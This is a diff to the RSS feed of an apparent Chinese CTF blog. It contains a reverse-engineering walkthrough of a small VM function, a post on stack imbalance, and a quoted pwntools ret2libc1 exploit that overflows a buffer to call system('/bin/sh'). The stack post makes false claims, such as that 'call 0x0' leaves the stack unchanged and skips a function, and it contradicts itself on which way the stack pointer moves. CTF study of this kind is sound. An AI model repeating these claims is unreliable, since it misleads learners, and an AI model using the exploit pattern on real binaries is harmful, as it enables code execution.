+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;初始化：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;v9&lt;/code&gt;  初始化为  &lt;code&gt;0&lt;/code&gt; ，作为主循环的索引。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;v5&lt;/code&gt; ,  &lt;code&gt;v6&lt;/code&gt; ,  &lt;code&gt;v7&lt;/code&gt; ,  &lt;code&gt;v8&lt;/code&gt;  也初始化为  &lt;code&gt;0&lt;/code&gt; ，它们分别用于处理字符串和跟踪状态。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;主循环：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;while (1)&lt;/code&gt; ：无限循环，直到  &lt;code&gt;return&lt;/code&gt;  语句。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;result = v9;&lt;/code&gt; ：在每次循环开始时更新  &lt;code&gt;result&lt;/code&gt;  为当前索引。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;if (v9 &amp;gt;= a2) return result;&lt;/code&gt; ：如果索引  &lt;code&gt;v9&lt;/code&gt;  超过输入参数  &lt;code&gt;a2&lt;/code&gt; ，则返回当前结果，结束循环。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;switch 语句：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;根据  &lt;code&gt;a1[v9]&lt;/code&gt;  的值进行不同操作， &lt;code&gt;a1&lt;/code&gt;  是输入的整数数组。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;每种情况的分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#每种情况的分析&#34;&gt;#&lt;/a&gt; &lt;strong&gt;每种情况的分析：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 1:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v6 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; v4&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;将  &lt;code&gt;v4&lt;/code&gt;  存入  &lt;code&gt;Str&lt;/code&gt;  数组的偏移量  &lt;code&gt;v6 + 100&lt;/code&gt; ，并更新  &lt;code&gt;v6&lt;/code&gt;  和  &lt;code&gt;v8&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 2:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;将  &lt;code&gt;a1&lt;/code&gt;  中下一个元素与  &lt;code&gt;Str[v8]&lt;/code&gt;  相加，结果存入  &lt;code&gt;v4&lt;/code&gt; ，并将  &lt;code&gt;v9&lt;/code&gt;  增加  &lt;code&gt;2&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 3:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;LOBYTE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;将  &lt;code&gt;Str[v8]&lt;/code&gt;  减去  &lt;code&gt;a1[v9 + 1]&lt;/code&gt;  的低字节（使用  &lt;code&gt;LOBYTE&lt;/code&gt; ），结果存入  &lt;code&gt;v4&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 4:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;使用按位异或操作将  &lt;code&gt;a1[v9 + 1]&lt;/code&gt;  与  &lt;code&gt;Str[v8]&lt;/code&gt;  进行运算。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 5:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;将  &lt;code&gt;a1[v9 + 1]&lt;/code&gt;  与  &lt;code&gt;Str[v8]&lt;/code&gt;  相乘，结果存入  &lt;code&gt;v4&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 6:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v9&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;仅增加  &lt;code&gt;v9&lt;/code&gt; ，不进行任何其他操作。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 7:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v7 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;what a shame...&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;检查  &lt;code&gt;Str[v7 + 100]&lt;/code&gt;  是否等于  &lt;code&gt;a1[v9 + 1]&lt;/code&gt; ，如果不等，则打印错误信息并退出程序。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 8:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v5&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; v4&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;将  &lt;code&gt;v4&lt;/code&gt;  存入  &lt;code&gt;Str&lt;/code&gt;  数组的偏移量  &lt;code&gt;v5&lt;/code&gt; ，并更新  &lt;code&gt;v5&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 10:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Str&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;从输入读取数据到  &lt;code&gt;Str&lt;/code&gt;  中。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 11:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;将  &lt;code&gt;Str[v8]&lt;/code&gt;  减去  &lt;code&gt;1&lt;/code&gt; ，结果存入  &lt;code&gt;v4&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;case 12:&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;将  &lt;code&gt;Str[v8]&lt;/code&gt;  加上  &lt;code&gt;1&lt;/code&gt; ，结果存入  &lt;code&gt;v4&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;default:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;不执行任何操作，继续循环。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h3 id=&#34;潜在用途分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#潜在用途分析&#34;&gt;#&lt;/a&gt; &lt;strong&gt;潜在用途分析：&lt;/strong&gt;&lt;/h3&gt;
+&lt;h4 id=&#34;1-逻辑概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-逻辑概述&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1. 逻辑概述：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;vm_operad&lt;/code&gt;  函数似乎是一个简单的虚拟机或解释器，它根据传入的指令数组  &lt;code&gt;a1&lt;/code&gt;  逐步操作数组  &lt;code&gt;Str&lt;/code&gt;  和变量  &lt;code&gt;v4&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;这个函数可以执行多种操作，如加法、减法、乘法、异或等，处理相应的数据并将结果存储在  &lt;code&gt;Str&lt;/code&gt;  中。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;2-关键指令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-关键指令&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2. 关键指令：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;读入数据&lt;/strong&gt;：通过  &lt;code&gt;read(Str)&lt;/code&gt;  可能是让用户输入数据以进一步处理。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;条件检查&lt;/strong&gt;：在  &lt;code&gt;case 7&lt;/code&gt;  中，如果输入不匹配，会导致程序退出，表明某些输入的有效性检查。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;3-输出逻辑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-输出逻辑&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3. 输出逻辑：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;puts(&amp;quot;what a shame...&amp;quot;)&lt;/code&gt;  提示可能与程序的输入或逻辑错误有关，提示用户输入的值不符合预期。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h3 id=&#34;建议的进一步步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#建议的进一步步骤&#34;&gt;#&lt;/a&gt; &lt;strong&gt;建议的进一步步骤：&lt;/strong&gt;&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;观察输入数据结构&lt;/strong&gt;：分析传入的  &lt;code&gt;a1&lt;/code&gt;  数组内容，特别是其在  &lt;code&gt;main&lt;/code&gt;  函数中是如何被填充的。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;跟踪执行&lt;/strong&gt;：使用调试工具逐步跟踪  &lt;code&gt;vm_operad&lt;/code&gt;  的执行，观察  &lt;code&gt;Str&lt;/code&gt;  和  &lt;code&gt;v4&lt;/code&gt;  的变化。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;构造测试用例&lt;/strong&gt;：通过手动构造适当的  &lt;code&gt;a1&lt;/code&gt;  数组来观察函数的行为，以找到可能的输出或  &lt;code&gt;flag&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+&lt;p&gt;希望这个分析对你进一步理解  &lt;code&gt;vm_operad&lt;/code&gt;  的逻辑有帮助！如果你还有其他问题或者需要更深入的讨论，请告诉我！&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://0d0-1yp0.github.io/2024/11/28/CTF/binary/%E5%A0%86%E6%A0%88%E4%B8%8D%E5%B9%B3%E8%A1%A1,%E5%B8%83%E6%A0%88/</guid>
+            <title>堆栈不平衡，布栈</title>
+            <link>https://0d0-1yp0.github.io/2024/11/28/CTF/binary/%E5%A0%86%E6%A0%88%E4%B8%8D%E5%B9%B3%E8%A1%A1,%E5%B8%83%E6%A0%88/</link>
+            <category term="CTF" scheme="https://0d0-1yp0.github.io/categories/CTF/" />
+            <category term="二进制安全" scheme="https://0d0-1yp0.github.io/categories/CTF/binary/" />
+            <category term="基础" scheme="https://0d0-1yp0.github.io/tags/%E5%9F%BA%E7%A1%80/" />
+            <category term="二进制" scheme="https://0d0-1yp0.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" />
+            <category term="CTF" scheme="https://0d0-1yp0.github.io/tags/CTF/" />
+            <pubDate>Thu, 28 Nov 2024 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;堆栈不平衡&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#堆栈不平衡&#34;&gt;#&lt;/a&gt; 堆栈不平衡&lt;/h1&gt;
+&lt;p&gt;通常是由于函数调用和返回过程中堆栈操作的不匹配。每当调用一个函数时，程序会将当前的栈指针（SP）和返回地址压入堆栈，这会影响到后续的堆栈操作。&lt;/p&gt;
+&lt;p&gt;例如，假设一个函数调用  &lt;code&gt;func&lt;/code&gt; ，在进入  &lt;code&gt;func&lt;/code&gt;  时，栈指针会增加（即压入返回地址）。如果在  &lt;code&gt;func&lt;/code&gt;  中未正确地平衡堆栈（比如未能弹出相应的值），那么在返回时，栈指针可能会指向一个不正确的位置，导致堆栈不平衡。&lt;/p&gt;
+&lt;p&gt;至于栈指针的修改，可以通过调整指令来确保调用的函数有正确的返回地址。例如，修改  &lt;code&gt;call&lt;/code&gt;  指令的目标地址为  &lt;code&gt;0&lt;/code&gt; ，可以防止调用某个函数，这在某些逆向工程中是用于跳过不必要的函数调用或陷阱，达到对程序行为的控制。&lt;/p&gt;
+&lt;p&gt;简单来说，理解堆栈的操作顺序和调用约定是非常重要的。通过反汇编工具分析这些操作，可以更好地理解程序的执行流程和潜在的漏洞。你可以从调试程序，观察栈的变化入手，加深对这些概念的理解。&lt;/p&gt;
+&lt;p&gt;要深入理解堆栈不平衡的问题，我们可以从堆栈的工作原理和汇编代码角度进行分析。&lt;/p&gt;
+&lt;h3 id=&#34;1-堆栈的基本概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-堆栈的基本概念&#34;&gt;#&lt;/a&gt; 1. 堆栈的基本概念&lt;/h3&gt;
+&lt;p&gt;堆栈是一种后进先出（LIFO）的数据结构，用于存储函数调用的信息，包括返回地址、局部变量和参数。堆栈的顶端通常由栈指针（SP）指向。&lt;/p&gt;
+&lt;h3 id=&#34;2-函数调用的过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-函数调用的过程&#34;&gt;#&lt;/a&gt; 2. 函数调用的过程&lt;/h3&gt;
+&lt;p&gt;当一个函数被调用时，会执行以下步骤：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;保存返回地址&lt;/strong&gt;：调用指令（如  &lt;code&gt;call func&lt;/code&gt; ）会将当前指令的下一条地址压入堆栈。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;调整栈指针&lt;/strong&gt;：栈指针会减少（在 x86 架构中，栈向下增长）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;进入函数体&lt;/strong&gt;：函数内部可以通过栈来存储局部变量。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;示例代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#示例代码&#34;&gt;#&lt;/a&gt; 示例代码&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;push ebp           ; 保存旧的基指针
+mov ebp, esp      ; 设置新的基指针
+sub esp, 16       ; 为局部变量分配空间
+
+; 函数体
+
+mov esp, ebp      ; 恢复栈指针
+pop ebp           ; 恢复旧的基指针
+ret                ; 返回
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;3-堆栈不平衡的原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-堆栈不平衡的原因&#34;&gt;#&lt;/a&gt; 3. 堆栈不平衡的原因&lt;/h3&gt;
+&lt;p&gt;如果在函数中未正确弹出压入的值，或者在返回之前没有恢复堆栈状态，就会导致堆栈不平衡。比如，如果你在函数内部多次压入值而没有相应的弹出，堆栈将继续增长，最终导致溢出。&lt;/p&gt;
+&lt;h3 id=&#34;4-栈指针的修改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-栈指针的修改&#34;&gt;#&lt;/a&gt; 4. 栈指针的修改&lt;/h3&gt;
+&lt;p&gt;栈指针的修改通常涉及  &lt;code&gt;push&lt;/code&gt;  和  &lt;code&gt;pop&lt;/code&gt;  指令。例如，如果需要跳过某个函数的执行，可以将  &lt;code&gt;call&lt;/code&gt;  指令的目标地址更改为  &lt;code&gt;0&lt;/code&gt; ，这样不会实际调用任何函数，从而避免栈指针的进一步修改。&lt;/p&gt;
+&lt;h4 id=&#34;伪代码示例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪代码示例&#34;&gt;#&lt;/a&gt; 伪代码示例&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;call 0x0         ; 不会改变堆栈状态
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;5-可视化结构图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-可视化结构图&#34;&gt;#&lt;/a&gt; 5. 可视化结构图&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;[ ESP ]   --&amp;gt;  | Return Address | &amp;lt;-- call func
+               | Local Var 1    |
+               | Local Var 2    |
+               | ...            |
+               | Old EBP        |
+[ EBP ]   --&amp;gt;  | Base Pointer   |
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;6-逆向工程的实用技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6-逆向工程的实用技巧&#34;&gt;#&lt;/a&gt; 6. 逆向工程的实用技巧&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;使用调试工具&lt;/strong&gt;：例如 GDB 或 x64dbg，逐步执行代码，观察堆栈的变化。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;分析调用约定&lt;/strong&gt;：了解不同平台（如 x86 和 x64）的调用约定，这对逆向非常重要。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;编写脚本&lt;/strong&gt;：可以使用 Python 等语言结合工具（如 IDA Pro 或 Ghidra）自动化分析任务。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;掌握这些基础知识后，继续深入学习汇编语言和计算机体系结构将有助于你成为真正的逆向工程大师！&lt;/p&gt;
+&lt;h1 id=&#34;布栈&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#布栈&#34;&gt;#&lt;/a&gt; 布栈&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;教我做一道 CTF 中的 pwn 题: #!/usr/bin/env python from pwn import *  sh = process (&#39;./ret2libc1&#39;)  binsh_addr = 0x8048720 system_plt = 0x08048460 payload = flat ([b&#39;a&#39; * 112, system_plt, b&#39;b&#39; * 4, binsh_addr]) sh.sendline (payload)  sh.interactive () 这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 &#39;bbbb&#39; 作为虚假的地址，其后参数对应的参数内容。  你看他布栈的时候，为什么要 system_plt 后面要布一个虚假的地址，然后才是参数呢，这里没太懂&lt;/p&gt;
+&lt;/blockquote&gt;
